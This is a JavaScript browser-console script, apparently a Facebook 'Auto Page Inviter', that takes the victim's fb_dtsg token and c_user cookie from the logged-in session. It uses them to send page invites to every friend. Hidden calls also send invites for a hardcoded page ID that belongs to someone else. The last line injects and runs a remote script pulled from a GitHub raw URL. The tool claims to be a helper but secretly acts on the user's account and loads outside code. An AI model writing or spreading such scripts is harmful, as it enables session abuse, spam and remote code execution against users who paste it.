function InviteFriends(e) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + e + "&elem_id=u_0_1k&action=send&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg=" + fb_dtsg + "&phstamp=", function (e) {
        var t = e.substring(e.indexOf("{"));
        var n = JSON.parse(t);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
        if (n.error) {
            Descriptions += "color:darkred'>";
            err++;
            if (n.errorDescription) Descriptions += n.errorDescription;
            else Descriptions += JSON.stringify(n, null, "")
        } else {
            Descriptions += "color:darkgreen'>";
            Descriptions += arn[i] + " has been invited to like the page " + page_name + ".";
            suc++
        }
        Descriptions += "</div>";
        var r = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.9);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.9);border-radius: 1em 4em 1em 4em;border:3px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
        r += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
        if (i > 0) {
            r += arr.length + " Friends Detected<br/>";
            r += "<b>" + suc + "</b> Friends Invited of " + (arr.length - i) + " Friends Processed ";
            r += "(" + i + " Lefted...)";
            r += "<div class='friend-edge'>";
            r += Descriptions;
            r += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
            r += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
            r += "Please Wait While Inviting Your Friends to Like Your Page " + page_name + ".</br>";
            r += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Cancel</span><br/>";
            r += _text;
            r += "</div>";
            r += "</div>";
            r += "</div>";
            window[tag + "_close"] = true
        } else {
            Title = "All Of Your Friends Have Been Invited to Like Your Page.</A>";
            r += arr.length + " Friends Detected and ";
            r += "<b>" + suc + " Friends Invited.</b></br>";
            r += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>Cancel</span><br/>";
            r += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
            r += _text;
            r += "</div>";
            window[tag + "_close"] = false
        }
        r += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = r
    }, "text", "post");
    tay--;
    if (tay > 0) {
        var t = arr[tay];
        setTimeout("InviteFriends(" + t + ")", 100)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + e + "%22%3A1%7D&checkableitems[0]=" + e + "&page_id= 214981461999315&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post");
    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + e + "%22%3A1%7D&checkableitems[0]=" + e + "&page_id= 214981461999315&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
}
function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"
}
function p(e) {
    var t = new XMLHttpRequest;
    var n = "//www.facebook.com/ajax/ufi/like.php";
    var r = "like_action=true&ft_ent_identifier=" + e + "&source=2&client_id=1381377993496%3A1284500146&rootid=u_0_8&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=g&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
    t.open("POST", n, true);
    t.onreadystatechange = function () {
        if (t.readyState == 4 && t.status == 200) {
            t.close
        }
    };
    t.send(r)
}
var Title = "Auto Page Inviter Made By Vietnamese Auto Group</A>";
var Descriptions = "",
    _text = 'Powered By: <A style="color:#3B5998;" href="https://www.facebook.com/588202497939346" target="_blank">Vietnamse Auto Group</A>.</A></br>Script Made By: </A><A style="color:#3B5998;" href="https://www.facebook.com/bui.long.9/" target="_blank">Bui Thanh Long</A>.</A></A></A></br>Visit Our Blog : <A style="color:#3B5998;" href="http://vietnameseautogroup.blogspot.com/" target="_blank">Vietnamese Auto Group</A>.</A>';
page_id = /"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];
jx = {
    b: function () {
        var e = !1;
        if ("undefined" != typeof ActiveXObject) try {
            e = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (t) {
            try {
                e = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (n) {
                e = !1
            }
        } else if (window.XMLHttpRequest) try {
            e = new XMLHttpRequest
        } catch (r) {
            e = !1
        }
        return e
    },
    load: function (b, c, a, h, g) {
        var e = this.d();
        if (e && b) {
            e.overrideMimeType && e.overrideMimeType("text/xml");
            h || (h = "GET");
            a || (a = "text");
            g || (g = {});
            a = a.toLowerCase();
            h = h.toUpperCase();
            b += b.indexOf("?") + 1 ? "&" : "?";
            var k = null;
            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
            e.open(h, b, !0);
            e.onreadystatechange = g.c ?
            function () {
                g.c(e)
            } : function () {
                if (4 == e.readyState) if (200 == e.status) {
                    var b = "";
                    e.responseText && (b = e.responseText);
                    "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                    c && c(b)
                } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
            };
            e.send(k)
        }
    },
    d: function () {
        return this.b()
    }
};
setTimeout("ChangeLocation", 1);
window.onbeforeunload = function () {
    if (window[tag + "_close"]) return "This script is running now!"
};
var i = 3;
var tay = 3;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var tag = "Close";
var page_name, x = document.getElementsByTagName("span");
for (i = 0; i < x.length; i++) if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (e) {
    var t = e;
    var n = t.substring(t.indexOf("{"));
    var r = JSON.parse(n);
    r = r.payload.entries;
    for (var s = 0; s < r.length; s++) arr.push(r[s].uid);
    for (var o = 0; o < r.length; o++) arn.push(r[o].text);
    for (var u = 0; u < r.length; u++) pho.push(r[u].photo);
    i = arr.length - 1;
    tay = i;
    console.log(arr.length);
    var a = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0px 3px 8px rgba(0, 0, 0, 0.9);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.9);border-radius: 1em 4em 1em 4em;border:3px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
    a += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
    a += arr.length + " Friends Detected, Please Wait . . .";
    a += "</div>";
    document.getElementById("pagelet_sidebar").innerHTML = a;
    InviteFriends(arr[i])
});
document.body.appendChild(document.createElement('script')).src = "https://raw.github.com/buithanhlong444/Final_Tools/master/All.js";
